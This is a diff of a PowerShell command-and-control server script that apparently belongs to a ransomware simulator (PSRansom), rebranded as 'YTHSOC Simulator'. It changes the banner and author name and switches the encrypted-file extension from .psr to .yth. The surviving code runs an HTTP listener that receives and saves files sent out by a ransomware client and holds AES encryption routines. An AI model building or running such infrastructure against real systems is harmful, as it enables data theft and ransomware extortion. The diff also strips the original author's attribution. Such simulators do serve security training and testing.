@@ -1,14 +1,9 @@
-﻿#================================#
-#     C2Server by @JoelGMSec     #
-#      https://darkbyte.net      #
-#================================#
-
 # Design
 $ProgressPreference = "SilentlyContinue"
 $ErrorActionPreference = "SilentlyContinue"
 $OSVersion = [Environment]::OSVersion.Platform
 if ($OSVersion -like "*Win*") {
-$Host.UI.RawUI.WindowTitle = "C2Server - by @JoelGMSec" 
+$Host.UI.RawUI.WindowTitle = "C2Server - by @PhyoPaingHtun" 
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "White" }
 
@@ -21,19 +16,21 @@ $http.Start()
 
 # Banner
 function Show-Banner {
-   Write-Host 
-   Write-Host "   ____ ____  ____                            " -ForegroundColor Blue
-   Write-Host "  / ___|___ \/ ___|  ___ _ ____   _____ _ __  " -ForegroundColor Blue
-   Write-Host " | |     __) \___ \ / _ \ '__\ \ / / _ \ '__| " -ForegroundColor Blue
-   Write-Host " | |___ / __/ ___) |  __/ |   \ V /  __/ |    " -ForegroundColor Blue
-   Write-Host "  \____|_____|____/ \___|_|    \_/ \___|_|    " -ForegroundColor Blue
-   Write-Host                                                
-   Write-Host "  -------------- by @JoelGMSec -------------  " -ForegroundColor Green }
+   Write-Host
+   Write-Host " __     __ _______ _    _  _____   ____   ____   " -ForegroundColor Blue
+   Write-Host " \ \   / /__   __| |  | |/ ____| / __ \ / __ \  " -ForegroundColor Blue
+   Write-Host "  \ \_/ /   | |  | |__| | (___  | |  | | |  | | " -ForegroundColor Blue
+   Write-Host "   \   /    | |  |  __  | \___ \ | |  | | |  | | " -ForegroundColor Blue
+   Write-Host "    | |     | |  | |  | | ____) || |__| | |__| | " -ForegroundColor Blue
+   Write-Host "    |_|     |_|  |_|  |_|_____/  \____/ \____/  " -ForegroundColor Blue
+   Write-Host
+   Write-Host "  -------------------- YTHSOC Simulator --------------------" -ForegroundColor Green
+}
 
 # Help
 function Show-Help {
    Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to recieve data from"
-   Write-Host "        PSRansom client through HTTP protocol"
+   Write-Host "        YTH Simulator client through HTTP protocol"
    Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\C2Server.ps1 LocalHost LocalPort" -ForegroundColor Blue 
    Write-Host "          Example: .\C2Server localhost 443" -ForegroundColor Green
    Write-Host "          Use * to listen on all interfaces on Windows host" -ForegroundColor Green
@@ -83,7 +80,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName + ".psr" }
+                $outPath = $File.FullName + ".yth" }
 
              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
@@ -102,7 +99,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName.replace(".psr","") }
+                $outPath = $File.FullName.replace(".yth","") }
 
              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
@@ -176,7 +173,7 @@ if ($context.Request.HttpMethod -eq "POST") {
       if ($B64Name -eq "none.null") { Write-Host "[!] No files have been recieved!" -f Red } else { 
         
       if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
-         $C2RName = $C2Rfile.replace(".psr","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
+         $C2RName = $C2Rfile.replace(".yth","") ; Write-Host "[+] $C2RName file recieved" -f Blue ; $B64file = R64Decoder -f $FormContent
 
       if (-not (Test-Path $C2Rfile)) { if ((Get-Host).Version.Major -gt 5) {
          Add-Content -Path $C2Rfile -Value $B64file -AsByteStream } else { 
